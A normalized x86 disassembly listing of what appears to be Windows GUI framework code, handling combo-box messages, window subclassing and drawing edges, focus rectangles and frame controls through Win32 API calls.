or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_43b50c
sub_42f9f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43adf8
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_43ad24
mov eax [ esi + 0x4 ]
or eax 0x200240
xor edx edx
mov dl [ ebx + 0x276 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x275 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x274 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_42fa59
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov ebx eax
mov eax ebx
call sub_42f678
mov eax ebx
call sub_43df6c
mov [ ebx + 0x248 ] eax
mov esi [ ebx + 0x278 ]
test esi esi
je r-xdata
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x278 ]
call sub_403294
xor eax eax
mov [ ebx + 0x278 ] eax
cmp [ ebx + 0x260 ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
mov eax ebx
call sub_43df6c
push eax
call GetWindow
mov esi eax
test esi esi
je r-xdata
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x260 ]
jge r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x240 ] 0x0
je r-xdata
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
push 0x0
mov eax [ ebx + 0x260 ]
push eax
push 0x14e
mov eax ebx
call sub_43df6c
push eax
call SendMessageA
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x260 ] eax
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
mov edi esi
mov [ ebx + 0x240 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x250 ] eax
mov eax [ ebx + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x240 ]
push eax
call SetWindowLongA
mov edi esi
mov [ ebx + 0x244 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x258 ] eax
mov eax [ ebx + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push esi
call GetWindow
mov esi eax
sub_42fb9c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_43b308
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x260 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov esi eax
mov [ ebx + 0x278 ] esi
mov edx [ ebx + 0x23c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_42fbec
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_41e1b8
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x10
pop esi
pop ebx
retn
sub_42fc40
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push ebx
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43df6c
push eax
call SendMessageA
mov eax [ esi ]
cmp eax [ ebx ]
seta al
pop esi
pop ebx
pop ebp
retn
sub_42fc6c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42fd28
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4377ac
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43df6c
push eax
call SendMessageA
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
inc edx
lea eax [ ebp - 0xc ]
call sub_4045b0
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43df6c
push eax
call SendMessageA
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_4377dc
mov bx [ ebp - 0x4 ]
mov edx ebx
mov eax ebx
call sub_406a24
push eax
push 0x0
push 0x142
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43df6c
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fd2f
lea eax [ ebp - 0xc ]
call sub_404050
retn
sub_42fd34
push ebp
mov ebp esp
mov ecx 0xb
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4300ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43cf50
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4300f3
lea eax [ ebp - 0x58 ]
mov edx 0x5
call sub_404074
lea eax [ ebp - 0x44 ]
call sub_404050
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_404074
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_404074
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404074
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x26c ]
cmp eax 0x1f4
jb r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_4377ac
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_4040a4
jmp r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_404050
mov al [ ebx ]
sub al 0x8
je r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_42fc40
pop ecx
test al al
je r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
push ebp
call sub_42fc6c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
sub al 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_404310
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40bf44
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4377ac
mov eax [ ebp - 0x38 ]
call sub_404310
test eax eax
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403490
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_42ec68
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_404310
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_4045b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_404310
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_4045b0
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4377ac
mov esi [ ebp - 0x8 ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42ec8c
jmp r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_42fc40
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42ec68
test al al
jne r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_40bf44
cmp al 0x2
je r-xdata
lea eax [ ebp - 0x50 ]
mov dl [ ebx ]
call sub_404238
mov ecx [ ebp - 0x50 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
lea eax [ ebp - 0x14 ]
call sub_40435c
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov ecx [ ebp - 0x8 ]
mov edx 0x1
call sub_404570
mov eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x4c ]
mov dl [ ebx ]
call sub_404238
mov ecx [ ebp - 0x4c ]
lea eax [ ebp - 0x14 ]
pop edx
call sub_40435c
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_42ec8c
dec esi
lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_404570
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call SendMessageA
lea eax [ ebp - 0x40 ]
push eax
mov edx [ ebp - 0xc ]
inc edx
mov ecx 0x7fffffff
mov eax [ ebp - 0x14 ]
call sub_404570
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
mov edx [ ebp - 0x10 ]
call sub_40435c
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_4377dc
mov edi esi
dec edi
mov edx edi
mov eax edi
call sub_406a24
push eax
push 0x0
push 0x142
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call SendMessageA
lea edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_4377ac
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_4040a4
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4300fc
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov [ ebx ] 0x0
cmp [ ebp - 0x2c ] 0x102
jne r-xdata
lea eax [ ebp - 0x58 ]
mov dl [ ebp - 0x28 ]
call sub_404238
mov ecx [ ebp - 0x58 ]
lea eax [ ebp - 0x54 ]
mov edx [ ebp - 0x14 ]
call sub_40435c
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_4300fc
test al al
je r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
mov [ ebx ] 0x0
jmp r-xdata
sub_4300fc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4302b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404310
test eax eax
jne r-xdata
mov eax esi
call sub_404510
push eax
push 0xffffffff
push 0x14c
mov eax ebx
call sub_43df6c
push eax
call SendMessageA
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax ebx
mov si 0xffb3
call sub_403490
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4302b8
lea eax [ ebp - 0x1c ]
call sub_404050
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_404074
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp eax [ ebp - 0x8 ]
setne [ ebp - 0x9 ]
cmp [ ebx + 0x290 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push 0x14e
mov eax ebx
call sub_43df6c
push eax
call SendMessageA
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
lea eax [ ebx + 0x270 ]
mov edx esi
call sub_4040a4
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x18 ]
push eax
mov eax esi
call sub_404310
mov edx eax
inc edx
mov ecx 0x7fffffff
pop eax
call sub_404570
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_40435c
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_4377dc
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_4377ac
mov eax [ ebp - 0x1c ]
call sub_404310
push eax
mov eax esi
call sub_404310
pop edx
call sub_406a24
push eax
push 0x0
push 0x142
mov eax ebx
call sub_43df6c
push eax
call SendMessageA
jmp r-xdata
push 0x0
push 0x0
push 0x14f
mov eax ebx
call sub_43df6c
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_403490
mov eax ebx
mov si 0xffb2
call sub_403490
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_4302e4
push ebx
push esi
push edi
push ebp
mov esi eax
mov ebx [ edx + 0x8 ]
mov di [ ebx + 0x10 ]
mov ebp [ ebx + 0x10 ]
test ebp 0x1000
je r-xdata
test ebp 0x20
je r-xdata
or di 0x1000
mov edx [ ebx + 0x18 ]
mov eax [ esi + 0x208 ]
call sub_41e984
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x208 ]
call sub_41e824
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x208 ]
call sub_41e840
cmp [ ebx + 0x8 ] 0x0
jl r-xdata
or di 0x20
mov ebp [ ebx + 0x8 ]
test ebp ebp
jl r-xdata
test di 0x1
je r-xdata
lea edx [ ebx + 0x1c ]
mov eax [ esi + 0x208 ]
call sub_41e528
push edi
lea ecx [ ebx + 0x1c ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x110 ]
jmp r-xdata
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41e184
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41d9b8
xor edx edx
mov eax [ esi + 0x208 ]
call sub_41e984
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x1c ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call DrawFocusRect
test di 0x10
je r-xdata
sub_4303bc
push ebx
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov edx [ esi + 0x238 ]
mov [ eax + 0x10 ] edx
cmp [ esi + 0x276 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
lea ecx [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
sub_4303e8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_438e48
mov eax ebx
call sub_4379d4
test al al
je r-xdata
cmp [ ebx + 0x276 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44e0a8
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_437e6c
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4379e4
sub_430460
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_42f254
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_41e1b8
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_4304bc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43c0fc
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e2d4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4306e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_436388
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41e184
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41e564
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41e564
cmp [ ebx + 0x165 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403294
retn
xor esi esi
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add esi [ ebx + 0x168 ]
test esi esi
jne r-xdata
add esi [ ebx + 0x168 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43714c
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_41e904
push eax
call GetWindowLongA
mov edi eax
test [ ebx + 0x162 ] 0x1
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41e184
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41e564
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41e564
test [ ebx + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x24 ] esi
test [ ebx + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x20 ] esi
test edi 0x200000
je r-xdata
add [ ebp - 0x1c ] esi
test [ ebx + 0x162 ] 0x8
je r-xdata
push 0x14
call GetSystemMetrics
add [ ebp - 0x1c ] eax
test edi 0x100000
je r-xdata
add [ ebp - 0x18 ] esi
xor eax eax
mov al [ ebx + 0x162 ]
xor edx edx
mov dl [ ebx + 0x165 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
xor eax eax
mov al [ ebx + 0x163 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41e904
push eax
call DrawEdge
push 0xa
call GetSystemMetrics
mov edx [ ebp - 0xc ]
sub edx eax
dec edx
mov [ ebp - 0x14 ] edx
mov eax ebx
call sub_42ec68
test al al
je r-xdata
push 0x15
call GetSystemMetrics
add [ ebp - 0x18 ] eax
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41e904
push eax
call DrawFrameControl
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41e904
push eax
call DrawFrameControl
jmp r-xdata
sub_4306f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_439c64
mov eax esi
mov edx [ r-xdata ]
call sub_403444
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_43071c
push ebx
mov ebx eax
mov eax ebx
call sub_4438e4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403444
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_430754
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_4307aa
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_4307b8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_439c98
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_43080c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43e9f8
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_430860
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_430884
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_43b980
mov eax ebx
mov si 0xffb5
call sub_403490
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_43df6c
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403490
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_4308fc
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_42b480
mov ebx eax
mov eax ebx
call sub_42b560
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_43df6c
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_42b660
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_430948
push ebx
push esi
mov esi edx
mov ebx eax
call sub_42b480
call sub_42b560
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43c3c0
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_430974
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43adf8
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_4309ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4307b8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_436f68
mov edx 0x19
mov eax esi
call sub_436f8c
mov dl 0x1
mov eax esi
call sub_43e1a0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_430a38
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_43e270
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_43df6c
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_43df6c
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_430a8c
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_43e270
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_44e0a8
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_438978
sub_430ac0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_430974
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_43ad24
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_430b28
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_43d3e8
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_44dfb0
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_403490
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403490
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_430b95
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_430c0e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4377ac
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44e038
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_43d3f0
mov eax ebx
mov si 0xffb8
call sub_403490
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403490
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430c15
sub_430c1c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_43d3f8
pop edi
pop esi
pop ebx
retn
sub_430c70
push ebx
push esi
mov esi edx
mov ebx eax
call sub_42b480
call sub_42b560
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_430c9c
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_42b480
mov ebx eax
